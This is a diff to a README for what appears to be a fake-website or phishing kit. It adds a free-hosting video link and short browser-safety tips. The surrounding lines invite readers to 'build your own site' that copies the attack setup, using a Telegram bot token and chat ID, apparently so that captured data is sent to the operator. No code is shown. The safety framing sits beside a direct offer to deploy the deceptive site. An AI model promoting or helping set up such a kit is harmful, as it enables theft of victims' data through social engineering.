@@ -17,6 +17,20 @@ Hackers create fake websites and use **social engineering** to manipulate users 
 
 ---
 
+**🌐 Free Hosting & Subdomain**
+
+> https://youtu.be/TV8CI3w6PlE
+
+---
+
+## 🛡️ Stay Safe — Prevention Tips
+
+- ✅ **Use a Script Blocker**: Browser extensions like uBlock Origin or NoScript can block unwanted scripts.
+- ✅ **Disable Auto Permissions**: Ensure your browser prompts before giving file access.
+- ✅ **Educate Others**: Share this knowledge to protect friends and family.
+
+---
+
 ## ⚙️ Build Your Own Site
 
 Create a similar setup by entering your **Telegram Bot Token** and **Chat ID** on the platform below 🔒
